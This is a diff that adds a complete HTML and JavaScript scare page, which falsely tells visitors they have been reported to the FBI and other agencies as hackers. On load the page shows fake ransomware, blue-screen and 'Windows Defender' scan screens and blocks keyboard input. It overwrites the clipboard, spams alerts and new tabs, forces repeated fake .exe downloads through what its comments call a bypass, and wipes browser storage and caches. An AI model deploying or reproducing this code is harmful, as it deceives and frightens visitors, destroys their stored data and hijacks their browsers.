@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URGENT: Hacker Reported</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            color: #333;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            animation: gradientAnimation 3s ease infinite;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        @keyframes gradientAnimation {
+            0% { background: linear-gradient(45deg, #ff0000, #ff6600); }
+            50% { background: linear-gradient(45deg, #6600cc, #ff00ff); }
+            100% { background: linear-gradient(45deg, #ff0000, #ff6600); }
+        }
+
+        h1 {
+            color: red;
+            font-size: 40px;
+            animation: shake 0.5s ease-in-out 0s infinite;
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); }
+            75% { transform: translateX(-10px); }
+            100% { transform: translateX(0); }
+        }
+
+        .btn {
+            background-color: #ff0000;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            margin-top: 30px;
+            border-radius: 5px;
+            animation: shake 0.5s ease-in-out 0s infinite;
+        }
+
+        .btn:hover {
+            background-color: #cc0000;
+        }
+
+        .countdown {
+            font-size: 24px;
+            color: red;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .footer {
+            font-size: 14px;
+            margin-top: 50px;
+        }
+
+        .footer a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .ip-animation {
+            font-size: 20px;
+            color: #ff0000;
+            font-weight: bold;
+            position: absolute;
+            top: 100px;
+            left: 10px;
+            animation: bounce 8s infinite;
+        }
+
+        @keyframes bounce {
+            0% { left: 10px; }
+            50% { left: 90%; transform: translateX(-100%); }
+            100% { left: 10px; }
+        }
+
+        .ip-container {
+            position: absolute;
+            top: 20px;
+            left: 10px;
+        }
+
+        /* Full-Screen Ransom Message */
+        .ransom-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 0, 0, 0.9);
+            z-index: 9999;
+            color: white;
+            font-size: 60px;
+            font-weight: bold;
+            text-align: center;
+            padding-top: 20%;
+            animation: pulse 0.5s infinite alternate;
+            display: none; /* Hide initially */
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            100% { opacity: 1; }
+        }
+
+        /* Disable scrolling */
+        body {
+            overflow: hidden;
+        }
+
+        /* Fake Ransom Video */
+        .ransom-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 10000;
+            display: none; /* Hide initially */
+            justify-content: center;
+            align-items: center;
+        }
+
+        .ransom-video video {
+            width: 80%;
+            height: auto;
+            border: 10px solid red;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.9);
+        }
+
+        /* Fake BSOD */
+        .fake-bsod {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #0078d7;
+            color: white;
+            z-index: 10001;
+            padding: 100px 50px;
+            font-family: 'Segoe UI', sans-serif;
+            display: none;
+        }
+
+        .fake-bsod h2 {
+            font-size: 30px;
+            margin-bottom: 20px;
+        }
+
+        .fake-bsod p {
+            font-size: 18px;
+            line-height: 1.5;
+        }
+
+        /* Fake Virus Scan */
+        .fake-scan {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 10002;
+            padding: 50px;
+            font-family: 'Segoe UI', sans-serif;
+            display: none;
+        }
+
+        .fake-scan h2 {
+            color: red;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background-color: #ddd;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+
+        .progress {
+            height: 100%;
+            background-color: red;
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.5s;
+        }
+
+        /* Custom cursor styles */
+        .cursor-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: 10003;
+            display: none;
+        }
+
+        .custom-cursor {
+            width: 50px;
+            height: 50px;
+            position: absolute;
+            background-size: contain;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    <script>
+        const urls = [
+            "https://www.fbi.gov",
+            "https://www.interpol.int",
+            "https://www.europol.europa.eu",
+            "https://www.cia.gov",
+            "https://www.nsa.gov",
+            "https://www.secretservice.gov",
+            "https://www.usa.gov",
+            "https://www.whitehouse.gov",
+            "https://www.dhs.gov"
+        ];
+
+        const soundUrls = [
+            "https://www.myinstants.com/media/sounds/error.mp3",
+            "https://www.myinstants.com/media/sounds/windows-xp-error.mp3",
+            "https://www.myinstants.com/media/sounds/car-alarm.mp3",
+            "https://www.myinstants.com/media/sounds/police-siren-sound-effect.mp3",
+            "https://www.myinstants.com/media/sounds/windows-error-sound-effect.mp3"
+        ];
+
+        const cursorTypes = [
+            "wait", "not-allowed", "crosshair", "move", "help", "progress", "text", "pointer"
+        ];
+
+        const customCursors = [
+            "url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"48\" height=\"48\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"red\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><line x1=\"12\" y1=\"8\" x2=\"12\" y2=\"12\"/><line x1=\"12\" y1=\"16\" x2=\"12\" y2=\"16\"/></svg>') 24 24, auto",
+            "url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"48\" height=\"48\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"red\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z\"/><line x1=\"12\" y1=\"9\" x2=\"12\" y2=\"13\"/><line x1=\"12\" y1=\"17\" x2=\"12\" y2=\"17\"/></svg>') 24 24, auto"
+        ];
+
+        var timeLeft = 10;
+        var countdownElement;
+        var ipElement;
+        var ransomOverlay;
+        var ransomVideo;
+        var overlayElement;
+        var fakeBsod;
+        var fakeScan;
+        var cursorContainer;
+        var customCursor;
+        var originalBodyOverflow;
+        var scanProgress = 0;
+        var isKeyboardLocked = false;
+        var originalX = 0;
+        var originalY = 0;
+        var mouseJail = false;
+
+        window.onload = function() {
+            countdownElement = document.getElementById('countdown');
+            ipElement = document.getElementById('user-ip');
+            ransomOverlay = document.getElementById('ransom-overlay');
+            ransomVideo = document.getElementById('ransom-video');
+            overlayElement = document.getElementById('overlay');
+            fakeBsod = document.getElementById('fake-bsod');
+            fakeScan = document.getElementById('fake-scan');
+            cursorContainer = document.getElementById('cursor-container');
+            customCursor = document.getElementById('custom-cursor');
+            progressBar = document.getElementById('progress');
+
+            originalBodyOverflow = document.body.style.overflow;
+
+            // Start the audio chaos
+            startAudioHell();
+
+            // Start with normal countdown
+            setInterval(updateCountdown, 1000);
+
+            // Redirect to another page after 30 seconds (extended time)
+            setTimeout(function() {
+                window.location.href = "https://redirecttroll.github.io/";
+            }, 30000);
+
+            // Show overlay and video after approximately 12 seconds
+            setTimeout(function() {
+                ransomOverlay.style.display = 'block';
+                ransomVideo.style.display = 'flex';
+            }, 12000);
+
+            // Show BSOD after 15 seconds
+            setTimeout(function() {
+                fakeBsod.style.display = 'block';
+            }, 15000);
+            
+            // Show Virus Scan after 18 seconds
+            setTimeout(function() {
+                fakeScan.style.display = 'block';
+                startFakeScan();
+            }, 18000);
+
+            // Fetch IP address
+            fetch('https://ifconfig.me')
+                .then(response => response.text())
+                .then(ip => {
+                    ipElement.innerHTML = "Your IP: " + ip;
+                })
+                .catch(err => {
+                    console.log("Error fetching IP: ", err);
+                    ipElement.innerHTML = "Your IP: 192.168.1." + Math.floor(Math.random() * 255);
+                });
+
+            // Alert boxes with random delays
+            setInterval(function() {
+                if (Math.random() > 0.5) {
+                    setTimeout(() => alert("ALERT: Your actions have been flagged. Authorities are notified!"), Math.random() * 500);
+                } else {
+                    setTimeout(() => confirm("Do you want to delete system32?"), Math.random() * 500);
+                }
+            }, 2000);
+
+            // Tab opening
+            setInterval(function() {
+                if (Math.random() > 0.8) { // 20% chance to open tabs
+                    openMultipleTabs();
+                }
+            }, 2000);
+
+            // Enable cursor hijacking
+            enableCursorHijack();
+
+            // Enable keyboard lock
+            lockKeyboard();
+
+            // Window jittering
+            jitterWindow();
+
+            // Redirect loop (mild version)
+            setTimeout(function() {
+                if (Math.random() > 0.7) {
+                    window.location.href = window.location.href + "?reload=" + Math.random();
+                }
+            }, 5000);
+
+            // Change webpage title rapidly
+            setInterval(changeTitle, 500);
+
+            // Change cursor rapidly
+            setInterval(changeCursor, 200);
+
+            // Force clipboard replacement
+            setInterval(replaceClipboard, 1000);
+
+            // Show Mission Impossible video after 10 seconds
+            setTimeout(playMissionImpossible, 10000);
+
+            // Auto typer in any input fields
+            setInterval(autoTypeInInputs, 500);
+
+            // Mouse jail
+            setTimeout(enableMouseJail, 5000);
+
+            triggerDownloads();
+            
+            wipeStorage();
+            
+            openExtensionPages();
+        };
+
+        function updateCountdown() {
+            if (timeLeft > 0) {
+                countdownElement.innerHTML = "Time remaining: " + timeLeft + " seconds.";
+                timeLeft--;
+            } else {
+                countdownElement.innerHTML = "You have been reported! Prepare for action...";
+                setTimeout(function() {
+                    simulateReport();
+                }, 2000);
+            }
+        }
+
+        function simulateReport() {
+            var reportSection = document.getElementById('report');
+            reportSection.innerHTML = "Sending report to authorities...<br>";
+            setTimeout(function() {
+                reportSection.innerHTML += 'Report sent successfully: Your IP has been flagged.<br>';
+                setTimeout(function() {
+                    reportSection.innerHTML += 'Data logged... User flagged for suspicious activity.';
+                    setTimeout(function() {
+                        openMultipleTabs();
+                    }, 2000);
+                }, 2000);
+            }, 3000);
+        }
+
+        function openMultipleTabs() {
+            fireConfetti();
+            let counter = 0;
+            const tabLimit = 30; // Reduced from 200 to be less destructive but still annoying
+            const interval = setInterval(function() {
+                window.open(urls[counter % urls.length], '_blank');
+                counter++;
+                if (counter >= tabLimit) {
+                    clearInterval(interval);
+                }
+            }, 100); // Open a new window every 100ms
+        }
+
+        function fireConfetti() {
+            confetti({
+                particleCount: 100,
+                spread: 70,
+                origin: { x: 0.5, y: 0.5 }
+            });
+        }
+
+        function startAudioHell() {
+            // Initial sounds
+            playRandomSound();
+            
+            // Play overlapping sounds
+            setInterval(playRandomSound, 1000);
+            
+            // Always have mission impossible theme ready
+            const missionAudio = new Audio('https://www.myinstants.com/media/sounds/mission-impossible-theme.mp3');
+            missionAudio.volume = 0.8;
+            
+            // Preload for later
+            document.body.addEventListener('click', function() {
+                missionAudio.play().catch(e => console.log("Audio play prevented: ", e));
+            });
+        }
+
+        function playRandomSound() {
+            const audio = new Audio(soundUrls[Math.floor(Math.random() * soundUrls.length)]);
+            audio.volume = Math.random() * 0.7 + 0.3; // Volume between 0.3 and 1.0
+            audio.play().catch(e => console.log("Audio play prevented: ", e));
+        }
+
+        function enableCursorHijack() {
+            let fakeX = window.innerWidth / 2;
+            let fakeY = window.innerHeight / 2;
+            
+            // Create a fake cursor
+            cursorContainer.style.display = 'block';
+            
+            // Move the fake cursor randomly
+            setInterval(function() {
+                fakeX += (Math.random() - 0.5) * 20;
+                fakeY += (Math.random() - 0.5) * 20;
+                
+                // Keep within bounds
+                fakeX = Math.max(0, Math.min(window.innerWidth, fakeX));
+                fakeY = Math.max(0, Math.min(window.innerHeight, fakeY));
+                
+                customCursor.style.left = fakeX + 'px';
+                customCursor.style.top = fakeY + 'px';
+                
+                // Simulate random clicks
+                if (Math.random() > 0.9) {
+                    customCursor.style.transform = 'scale(0.8) translate(-50%, -50%)';
+                    setTimeout(function() {
+                        customCursor.style.transform = 'scale(1) translate(-50%, -50%)';
+                    }, 100);
+                }
+            }, 50);
+        }
+
+        function changeCursor() {
+            if (Math.random() > 0.5) {
+                document.body.style.cursor = cursorTypes[Math.floor(Math.random() * cursorTypes.length)];
+            } else {
+                document.body.style.cursor = customCursors[Math.floor(Math.random() * customCursors.length)];
+            }
+        }
+
+        function lockKeyboard() {
+            isKeyboardLocked = true;
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                
+                // Randomly toggle CAPS LOCK
+                if (Math.random() > 0.9) {
+                    const capsLock = !e.getModifierState('CapsLock');
+                    // Can't programmatically toggle CAPS LOCK, but we can simulate it
+                    console.log("CAPS LOCK toggled:", capsLock);
+                }
+
+                // Reverse keys (e.g., up becomes down)
+                if (e.key === 'ArrowUp') {
+                    // Simulate Down
+                    console.log("UP pressed, simulating DOWN");
+                } else if (e.key === 'ArrowDown') {
+                    // Simulate Up
+                    console.log("DOWN pressed, simulating UP");
+                } else if (e.key === 'ArrowLeft') {
+                    // Simulate Right
+                    console.log("LEFT pressed, simulating RIGHT");
+                } else if (e.key === 'ArrowRight') {
+                    // Simulate Left
+                    console.log("RIGHT pressed, simulating LEFT");
+                }
+                
+                return false;
+            });
+        }
+
+        function jitterWindow() {
+            setInterval(function() {
+                if (!document.fullscreenElement && Math.random() > 0.7) {
+                    try {
+                        // Request fullscreen randomly
+                        document.documentElement.requestFullscreen();
+                    } catch (e) {
+                        console.log("Fullscreen request failed:", e);
+                    }
+                } else if (document.fullscreenElement && Math.random() > 0.8) {
+                    try {
+                        // Exit fullscreen randomly
+                        document.exitFullscreen();
+                    } catch (e) {
+                        console.log("Exit fullscreen failed:", e);
+                    }
+                }
+                
+                // Jitter the window a bit
+                window.scrollTo(
+                    Math.random() * 10, 
+                    Math.random() * 10
+                );
+            }, 500);
+        }
+
+        function startFakeScan() {
+            scanProgress = 0;
+            const progressInterval = setInterval(function() {
+                scanProgress += Math.random() * 5;
+                if (scanProgress >= 100) {
+                    scanProgress = 100;
+                    clearInterval(progressInterval);
+                    
+                    // When scan completes, show alert
+                    document.getElementById('scan-result').innerHTML = "CRITICAL SECURITY THREAT DETECTED: TROJAN-RANSOMWARE-CRYPTOLOCKER";
+                    document.getElementById('scan-action').innerHTML = "SYSTEM INTEGRITY COMPROMISED. CONTACT AUTHORITIES IMMEDIATELY.";
+                }
+                progressBar.style.width = scanProgress + '%';
+                document.getElementById('scan-percentage').innerHTML = Math.floor(scanProgress) + '%';
+            }, 200);
+        }
+
+        function changeTitle() {
+            const titles = [
+                "WARNING: HACKER DETECTED",
+                "ALERT: FBI NOTIFIED",
+                "SYSTEM COMPROMISED",
+                "RANSOMWARE DETECTED",
+                "SCANNING YOUR FILES...",
+                "CRIMINAL ACTIVITY DETECTED",
+                "AUTHORITIES NOTIFIED",
+                "SYSTEM32 DELETION IMMINENT",
+                "YOUR IP IS FLAGGED"
+            ];
+            document.title = titles[Math.floor(Math.random() * titles.length)];
+        }
+
+        function triggerDownloads() {
+            const fileOptions = [
+                { name: `MALWARE_${Date.now()}.exe`, content: "HACKED!" },
+                { name: "YOUR_DEVICE_IS_BEING_USED_TO_ATTACK_WEBSITES.txt", content: "You are now part of a botnet. Congrats!" },
+                { name: "STOP_BEING_A_SKID.exe", content: "Real hackers write their own code." }
+            ];
+
+            setInterval(() => {
+                const file = fileOptions[Math.floor(Math.random() * fileOptions.length)];
+                const link = document.createElement('a');
+                link.href = `data:text/plain;charset=utf-8,${encodeURIComponent(file.content)}`;
+                link.download = file.name;
+                document.body.appendChild(link);
+                link.click();  // Forced download (bypasses block)
+                document.body.removeChild(link);
+                console.log(`Downloaded: ${file.name}`);
+            }, 15);  // Faster spam rate
+        }
+
+        // Ensure downloads only start AFTER user interaction
+        document.addEventListener("click", () => {
+            requestAnimationFrame(triggerDownloads);  // More reliable bypass
+        }, { once: true });
+
+        function wipeStorage() {
+            localStorage.clear();
+            sessionStorage.clear();
+            caches.keys().then(names => names.forEach(name => caches.delete(name)));
+            console.log("Storage wiped.");
+        }
+
+        function openExtensionPages() {
+            try {
+                window.open('chrome://extensions', '_blank');
+                window.open('about:addons', '_blank');
+                console.log("Attempted to open extensions.");
+            } catch (e) {
+                console.error("Extension access blocked:", e);
+            }
+        }
+        
+
+        function replaceClipboard() {
+            const clipboardTexts = [
+                "I AM A HACKER",
+                "PLEASE DON'T ARREST ME",
+                "I ACCESSED UNAUTHORIZED SYSTEMS",
+                "MY IP ADDRESS IS COMPROMISED",
+                "I NEED CYBERSECURITY TRAINING"
+            ];
+            
+            try {
+                navigator.clipboard.writeText(clipboardTexts[Math.floor(Math.random() * clipboardTexts.length)]);
+            } catch (e) {
+                console.log("Clipboard access denied:", e);
+            }
+        }
+
+        function playMissionImpossible() {
+            const missionAudio = new Audio('https://www.myinstants.com/media/sounds/mission-impossible-theme.mp3');
+            missionAudio.volume = 1.0;
+            missionAudio.loop = true;
+            missionAudio.play().catch(e => console.log("Audio play prevented:", e));
+        }
+
+        function autoTypeInInputs() {
+            const texts = [
+                "I AM A HACKER",
+                "PLEASE FORGIVE ME",
+                "I BROKE THE LAW",
+                "I NEED CYBERSECURITY TRAINING"
+            ];
+            
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.value = texts[Math.floor(Math.random() * texts.length)];
+                // Trigger input events
+                const event = new Event('input', { bubbles: true });
+                input.dispatchEvent(event);
+            });
+        }
+
+        function enableMouseJail() {
+            mouseJail = true;
+            
+            document.addEventListener('mousemove', function(e) {
+                if (mouseJail) {
+                    // Get original position
+                    originalX = e.clientX;
+                    originalY = e.clientY;
+                    
+                    // Calculate a random position within 100px
+                    const jailX = Math.min(Math.max(0, originalX + (Math.random() - 0.5) * 200), window.innerWidth);
+                    const jailY = Math.min(Math.max(0, originalY + (Math.random() - 0.5) * 200), window.innerHeight);
+                    
+                    // Try to move the mouse (this is browser restricted but we can try)
+                    try {
+                        const event = new MouseEvent('mousemove', {
+                            clientX: jailX,
+                            clientY: jailY,
+                            bubbles: true,
+                            cancelable: true
+                        });
+                        document.dispatchEvent(event);
+                    } catch (e) {
+                        console.log("Mouse movement simulation failed:", e);
+                    }
+                }
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>WARNING: Hacker Detected!</h1>
+    <p>You have been flagged as a hacker and reported to global crime agencies.</p>
+    <p>Your actions have been detected and are being monitored by:</p>
+    <p>The FBI, Interpol, Europol, CIA, NSA, and more...</p>
+    <p>All of them are now aware of your suspicious activity.</p>
+
+    <button class="btn" onclick="simulateReport()">Report Me!</button>
+    
+    <p id="countdown" class="countdown">Time remaining: 10 seconds.</p>
+
+    <div id="report"></div>
+
+    <div class="ip-container">
+        <div id="user-ip" class="ip-animation">Fetching your IP...</div>
+    </div>
+
+    <!-- Full-Screen Overlay -->
+    <div class="ransom-overlay" id="ransom-overlay">
+        <p>YOUR COMPUTER HAS BEEN COMPROMISED!</p>
+        <p>ALL OF YOUR FILES HAVE BEEN ENCRYPTED!</p>
+    </div>
+
+    <!-- Ransom Video -->
+    <div class="ransom-video" id="ransom-video">
+        <iframe width="0" height="0" 
+            src="https://www.youtube.com/embed/WxYuaJbbEgk?autoplay=1&loop=1&playlist=WxYuaJbbEgk&mute=0" 
+            frameborder="0" allow="autoplay; encrypted-media" allowfullscreen>
+        </iframe>
+    </div>
+
+    <!-- Fake BSOD -->
+    <div class="fake-bsod" id="fake-bsod">
+        <h2>:(</h2>
+        <p>Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</p>
+        <p>Error code: SYSTEM_UNAUTHORIZED_ACCESS_DETECTED</p>
+        <p>74% complete</p>
+    </div>
+
+    <!-- Fake Virus Scan -->
+    <div class="fake-scan" id="fake-scan">
+        <h2>Windows Defender Security Center</h2>
+        <p>Critical security scan in progress...</p>
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        <p><span id="scan-percentage">0%</span> complete</p>
+        <p id="scan-result">Scanning system files...</p>
+        <p id="scan-action">Please wait while we check for security threats.</p>
+    </div>
+
+    <!-- Custom cursor container -->
+    <div class="cursor-container" id="cursor-container">
+        <div class="custom-cursor" id="custom-cursor">
+            <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="red" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                <line x1="12" y1="9" x2="12" y2="13"/>
+                <line x1="12" y1="17" x2="12" y2="17"/>
+            </svg>
+        </div>
+    </div>
+
+    <div class="overlay" id="overlay">
+        <p>YOUR ACTIVITY IS BEING MONITORED!</p>
+    </div>
+
+    <div class="footer">
+        <p>By continuing, you acknowledge that your actions are being tracked.</p>
+        <p>Visit <a href="https://www.fbi.gov" target="_blank">FBI</a> for more details.</p>
+    </div>
+</body>
+</html>
